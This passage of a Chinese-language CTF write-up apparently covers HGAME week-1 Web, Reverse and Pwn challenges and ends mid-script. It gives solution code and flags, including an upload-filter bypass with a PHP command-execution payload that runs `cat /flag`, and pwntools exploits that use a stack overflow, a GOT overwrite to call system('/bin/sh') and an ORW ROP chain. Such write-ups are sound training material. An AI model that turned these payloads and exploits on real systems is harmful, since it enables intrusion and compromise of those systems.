class="line">          <span class="keyword">var</span> i = <span class="built_in">Function</span>(<span class="string">&#x27;return\x20(function()\x20&#x27;</span> + <span class="string">&#x27;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&#x27;</span> + <span class="string">&#x27;);&#x27;</span>);</span><br><span class="line">          g = i();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (j) &#123;</span><br><span class="line">          g = <span class="built_in">window</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> h = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span>;</span><br><span class="line">        g[<span class="string">&#x27;atob&#x27;</span>] || (g[<span class="string">&#x27;atob&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">k</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> l = <span class="built_in">String</span>(k)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/=+$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">          <span class="keyword">var</span> m = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0x0</span>, o, p, q = <span class="number">0x0</span>; p = l[<span class="string">&#x27;charAt&#x27;</span>](q++); ~p &amp;&amp; (o = n % <span class="number">0x4</span> ? o * <span class="number">0x40</span> + p : p, n++ % <span class="number">0x4</span>) ? m += <span class="built_in">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](<span class="number">0xff</span> &amp; o &gt;&gt; (-<span class="number">0x2</span> * n &amp; <span class="number">0x6</span>)) : <span class="number">0x0</span>) &#123;</span><br><span class="line">            p = h[<span class="string">&#x27;indexOf&#x27;</span>](p);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> m;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;());</span><br><span class="line">      b[<span class="string">&#x27;fqlkGn&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">g</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> h = atob(g);</span><br><span class="line">        <span class="keyword">var</span> j = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0x0</span>, l = h[<span class="string">&#x27;length&#x27;</span>]; k &lt; l; k++) &#123;</span><br><span class="line">          j += <span class="string">&#x27;%&#x27;</span> + (<span class="string">&#x27;00&#x27;</span> + h[<span class="string">&#x27;charCodeAt&#x27;</span>](k)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>))[<span class="string">&#x27;slice&#x27;</span>](-<span class="number">0x2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(j);</span><br><span class="line">      &#125;;</span><br><span class="line">      b[<span class="string">&#x27;iBPtNo&#x27;</span>] = &#123;&#125;;</span><br><span class="line">      b[<span class="string">&#x27;CFrzVf&#x27;</span>] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> f = b[<span class="string">&#x27;iBPtNo&#x27;</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (f === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      e = b[<span class="string">&#x27;fqlkGn&#x27;</span>](e);</span><br><span class="line">      b[<span class="string">&#x27;iBPtNo&#x27;</span>][c] = e;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      e = f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">  &#125;;</span><br><span class="line">  alert(atob(b(<span class="string">&#x27;\x30\x78\x30&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在控制台中运行，弹窗内容即为flag：<code>hgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;</code>。</p><p>​    </p><h3 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h3><blockquote><p>学校通知放寒假啦，兔兔兴高采烈的打算购买回家的车票，这时兔兔发现成为购票网站的会员账户可以省下一笔money……</p><p>想成为会员也很简单，只需要一点点HTTP的知识……等下，HTTP是什么，可以吃吗</p></blockquote><p>考察HTTP请求头中的User-Agent、Cookie、来源(Referer)和本地访问(X-Forwarded-For)。</p><p>需依次满足：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Cute-Bunny</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">JSON</span><br><span class="line">username=luckytoday</span><br><span class="line">password=happy123</span><br></pre></td></tr></table></figure><p>以JSON格式请求登录即可：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:31450</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Cute-Bunny</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>bunnybunnybunny.com</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>code=Vidar</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;luckytoday&quot;</span>,<span class="attr">&quot;password&quot;</span>:<span class="string">&quot;happy123&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>返回flag值：<code>hgame&#123;H0w_ArE_Y0u_T0day?&#125;</code>。</p><p>​    </p><h3 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h3><blockquote><p>刚加入Vidar的兔兔还认不清协会成员诶，学长要求的答对100次问题可太难了，你能帮兔兔写个脚本答题吗？</p></blockquote><p>查看源码：</p><p><code>&lt;!-- Hint: https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js --&gt;</code></p><p>访问发现为页面问题的答案，以list方式提取数据。</p><p>另在js文件中搜索发现页面的3个路由：</p><p>获取问题：<code>/api/getQuestion</code>，验证答案：<code>/api/verifyAnswer</code>，获取分数：<code>/api/getScore</code>。</p><p>python脚本模拟页面100次回答：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;ba1van4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;intro&quot;</span>: <span class="string">&quot;21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉&quot;</span>,</span><br><span class="line">        <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=kSt5er0OQMXROy28nzTia0A&amp;s=640&quot;</span>,</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://ba1van4.icu&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> data:</span><br><span class="line">    dic[k[<span class="string">&quot;intro&quot;</span>]] = k[<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:xxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    r = s.get(url+<span class="string">&#x27;/api/getQuestion&#x27;</span>)</span><br><span class="line">    intro = json.loads(r.text)[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">    <span class="comment">#print(intro)</span></span><br><span class="line">    r = s.post(url+<span class="string">&#x27;/api/verifyAnswer&#x27;</span>, data=&#123;<span class="string">&#x27;id&#x27;</span>:dic[intro]&#125;)</span><br><span class="line">    r = s.get(url+<span class="string">&#x27;/api/getScore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>运行得到100次循环后的结果：<code>&#123;&quot;message&quot;:&quot;hgame&#123;Guess_who_i_am^Happy_Crawler&#125;&quot;&#125;</code>。</p><p>​    </p><h3 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h3><blockquote><p>登陆了之前获取的会员账号之后，兔兔想找一张自己的可爱照片，上传到个人信息的头像中 :D</p><p>不过好像可以上传些奇怪后缀名的文件诶 XD</p></blockquote><p>图片文件上传，抓包尝试，文件名存在关键字黑名单，包括 <code>php/phtml/ini/htaccess</code> 等；</p><p>测试发现可以大小写绕过，将文件名后缀修改为 <code>Php</code>，内容修改为 <code>&lt;?=`cat /flag`;</code>，上传 <code>1.Php</code>，访问即可得到flag：<code>hgame&#123;Unsave_F1L5_SYS7em_UPL0ad!&#125;</code>。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="test-your-IDA"><a href="#test-your-IDA" class="headerlink" title="test your IDA"></a>test your IDA</h3><blockquote><p>签到</p></blockquote><p>IDA打开查看字符串有flag：<code>hgame&#123;te5t_y0ur_IDA&#125;</code>。</p><p>​    </p><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><blockquote><p>非常简单的汇编</p></blockquote><p>关键操作在 <code>xor eax, 33h</code>，将结果异或0x33即可还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x5b</span>,<span class="number">0x54</span>,<span class="number">0x52</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x56</span>,<span class="number">0x5f</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x47</span>,<span class="number">0x3</span>,<span class="number">0x6c</span>,<span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x2</span>,<span class="number">0x57</span>,<span class="number">0x12</span>,<span class="number">0x4e</span>]</span><br><span class="line">flag = [k^<span class="number">0x33</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;welc0me_t0_re_wor1d!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3><blockquote><p>easyenc</p></blockquote><p>代码逻辑为逐字符先异或0x32后减86，逆向还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">4</span>, <span class="number">255</span>, <span class="number">253</span>,   <span class="number">9</span>,   <span class="number">1</span>, <span class="number">243</span>, <span class="number">176</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>, </span><br><span class="line">  <span class="number">240</span>, <span class="number">173</span>,   <span class="number">7</span>,   <span class="number">6</span>,  <span class="number">23</span>,   <span class="number">5</span>, <span class="number">235</span>,  <span class="number">23</span>, <span class="number">253</span>,  <span class="number">23</span>, </span><br><span class="line">  <span class="number">234</span>,   <span class="number">1</span>, <span class="number">238</span>,   <span class="number">1</span>, <span class="number">234</span>, <span class="number">177</span>,   <span class="number">5</span>, <span class="number">250</span>,   <span class="number">8</span>,   <span class="number">1</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">172</span>, <span class="number">236</span>,   <span class="number">1</span>, <span class="number">234</span>, <span class="number">253</span>, <span class="number">240</span>,   <span class="number">5</span>,   <span class="number">7</span>,   <span class="number">6</span>, </span><br><span class="line">  <span class="number">249</span>]</span><br><span class="line"></span><br><span class="line">flag = [((k+<span class="number">86</span>)^<span class="number">0x32</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="a-cup-of-tea"><a href="#a-cup-of-tea" class="headerlink" title="a_cup_of_tea"></a>a_cup_of_tea</h3><blockquote><p>兔兔的家人都爱喝茶，所以兔兔带了些茶叶回去</p></blockquote><p>魔改了delta为 <code>0xABCDEF23</code> 的Tea算法，用解密算法还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = [<span class="number">0x2E63829D</span>, <span class="number">0xC14E400F</span>, <span class="number">0x9B39BFB9</span>, <span class="number">0x5A1F8B14</span>, <span class="number">0x61886DDE</span>, <span class="number">0x6565C6CF</span>, <span class="number">0x9F064F64</span>, <span class="number">0x236A43F6</span>, <span class="number">0x7D6B</span>]</span><br><span class="line">    cc = [long_to_bytes(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x23456789</span>, <span class="number">0x34567890</span>, <span class="number">0x45678901</span>]</span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">        d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">        flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>]+long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(c[-<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><blockquote><p>兔兔把自己行李箱的密码用一种编码写在了纸条上，但他忘了怎么解密，你能帮帮他吗？</p></blockquote><p>代码逻辑为将低4位和高4位分别取出存入 <code>v4[2*i]</code> 和 <code>v4[2*i+1]</code>，提取比对字符串 <code>dword_403000</code>，逆向还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>((c[<span class="number">2</span>*i+<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + c[<span class="number">2</span>*i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>pwn签到，直接 <code>cat flag</code> 得flag。</p><p>​    </p><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>简单栈溢出到 <code>b4ckd0or()</code> 函数上，特别的一点是用 <code>close(1)</code> 关闭了标准输出，可以用 <code>execv 1&gt;&amp;0</code> 将标准输出重定向到标准输入，因为默认打开一个终端后，0/1/2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31066</span>)</span><br><span class="line"></span><br><span class="line">b4ckd0or=<span class="number">0x401176</span></span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(b4ckd0or)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><blockquote><p>兔兔在买高铁票时想要选一个好座位。</p><p>HINTS:</p><p>数组下标的检查好像少了点东西</p></blockquote><p>由代码逻辑知可以写入bss段，只限制了上限未限制下限，使用负数可打GOT表内容。覆盖 <code>exit()</code> 的GOT表为 <code>main()</code> 使程序循环，再覆盖 <code>puts()</code> 的GOT表泄露 <code>puts()</code> 地址计算得到libc基地址，最后覆盖 <code>puts()</code> 的GOT表为 <code>system(&quot;/bin/sh\x00&quot;)</code>。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30831</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=elf.sym.main</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-6&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(p64(main))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-9&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base=puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-9&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(base+libc.sym.system))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><blockquote><p>HINTS:</p><p>标题就是考点捏，没思路的可以按照标题查一查</p><p>觉得溢出的不够多？那就先找个地方把ROP链写进去，再把栈迁移过去执行吧</p></blockquote><p>标题表明需orw，但开启了沙盒禁用了 <code>execve()/execveat()</code>，<code>read()</code> 读的字节数足以用ROP链泄露libc，但溢出字节0x28不足以执行orw，需先做栈迁移后，再执行orw。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30153</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x401393</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">main=elf.sym.main</span><br><span 